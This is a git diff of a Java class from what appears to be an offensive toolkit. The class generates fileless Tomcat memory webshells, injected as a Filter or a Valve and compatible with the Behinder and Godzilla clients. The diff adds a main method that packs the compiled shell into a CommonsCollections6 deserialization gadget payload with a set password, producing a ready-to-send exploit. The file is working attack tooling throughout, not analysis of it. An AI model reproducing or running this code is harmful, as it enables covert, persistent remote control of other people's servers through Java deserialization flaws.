@@ -1,8 +1,10 @@
 package com.droplab.Utils.Memory;
 
 import com.droplab.Utils.CommonUtils;
+import com.droplab.Utils.UnSerialize.SerializeFactory;
 import com.droplab.Utils.compile.JavaStringCompiler;
 
+import java.util.Base64;
 import java.util.Map;
 
 public class MemroyFactory {
@@ -39,7 +41,7 @@ public class MemroyFactory {
             String md5 = CommonUtils.getMD5(password);
             String behinder = md5.substring(0, 16); //冰蝎密码
 
-            /**生成内存马类
+            /*生成内存马类
              *
              */
             String implStrName = CommonUtils.RandomStr(6);
@@ -49,18 +51,27 @@ public class MemroyFactory {
             if (shellType.equals("Behinder")) {
                 format = String.format(implStr, implStrName, implStrName, behinder);
             } else if (shellType.equals("Godzilla")) {
-                format = String.format(implStr, implStrName, implStrName, password, CommonUtils.getMD5(password + "3ad85def8007425f"));
+                format = String.format(implStr, implStrName, implStrName,behinder, password, CommonUtils.getMD5(password + behinder));
             }
             Map<String, byte[]> compile = javaStringCompiler.compile(implStrName + ".java", format);
             byte[] bytes = compile.get(implStrName);
             String s = java.util.Base64.getEncoder().encodeToString(bytes);
-            /**
+            /*
              * 生成注入内存马的类
              */
             String addStrName = CommonUtils.RandomStr(6);
             Object o1 = Class.forName(addStr).newInstance();
             String addStrType = (String) o1.getClass().getMethod("get", Object.class, String.class, boolean.class).invoke(o1, o1, type, template);
-            String format1 = String.format(addStrType, addStrName, addStrName, s);
+            String format1 =null;
+
+            if(type.equals("Tomcat")){
+                if(middleware.equals("Filter")){
+                    format1 = String.format(addStrType, addStrName, addStrName, s, CommonUtils.RandomStr(10));
+                }else if(middleware.equals("Valve")){
+                    format1 = String.format(addStrType, addStrName, addStrName, s);
+                }
+            }
+
             Map<String, byte[]> compile1 = javaStringCompiler.compile(addStrName + ".java", format1);
             byte[] bytes1 = compile1.get(addStrName);
 
@@ -72,7 +83,10 @@ public class MemroyFactory {
     }
 
     public static void main(String[] args) {
-        System.out.println(MemroyFactory.instance().getMemoryShell("Tomcat", "Valve", "", "Godzilla", "", false));
+        String template=MemroyFactory.instance().getMemoryShell("Tomcat", "Filter", "qax36oNbs", "Behinder", "", true);
+
+        byte[] commonsCollections6s = SerializeFactory.instance().getObject("", "CommonsCollections6", Base64.getDecoder().decode(template));
+        System.out.println(java.util.Base64.getEncoder().encodeToString(commonsCollections6s));
     }
 
 }
